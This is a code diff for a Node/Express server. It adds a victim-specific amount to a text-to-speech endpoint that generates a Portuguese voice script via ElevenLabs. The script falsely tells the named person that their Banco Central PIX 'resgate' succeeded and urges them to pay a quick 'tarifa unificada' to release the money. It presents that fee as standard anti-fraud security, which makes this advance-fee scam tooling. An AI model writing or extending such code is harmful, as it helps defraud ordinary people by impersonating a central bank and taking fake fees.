@@ -543,14 +543,15 @@ app.get("/api/config", (req, res) => {
 
 // --- NOVO: TTS E BUYPIX ---
 app.post("/api/v1/tts", async (req, res) => {
-  const { name, attendantName, voiceId } = req.body;
+  const { name, attendantName, voiceId, value } = req.body;
   if (!name) return res.status(400).json({ error: "Nome não fornecido" });
   
   const firstName = name.split(" ")[0] || "Cidadão";
   const atendente = attendantName || "Assistente";
   const idVoz = voiceId || "GM2UA3fbsIaLHcswCDX9";
+  const valorTexto = value ? `no valor de ${value}` : "";
   
-  const script = `Oi, ${firstName}! Que bom que você chegou até aqui. Eu sou a ${atendente} e o seu processo de resgate deu super certo. Pra gente conseguir liberar esse PIX direto na sua conta do Banco Central agora mesmo, você só precisa pagar uma tarifa unificada rapidinho. Não se preocupe, isso é só uma segurança padrão contra fraudes. Assim que compensar no sistema, o valor total do seu resgate cai na sua conta em uns dois minutinhos. Clica no botão aqui embaixo e finaliza seu saque!`;
+  const script = `Oi, ${firstName}! Que bom que você chegou até aqui. Eu sou a ${atendente} e o seu processo de resgate ${valorTexto} deu super certo. Pra gente conseguir liberar esse PIX direto na sua conta do Banco Central agora mesmo, você só precisa pagar uma tarifa unificada rapidinho. Não se preocupe, isso é só uma segurança padrão contra fraudes. Assim que compensar no sistema, o valor total do seu resgate cai na sua conta em uns dois minutinhos. Clica no botão aqui embaixo e finaliza seu saque!`;
   
   try {
     const apiKey = process.env.ELEVENLABS_API_KEY || "";
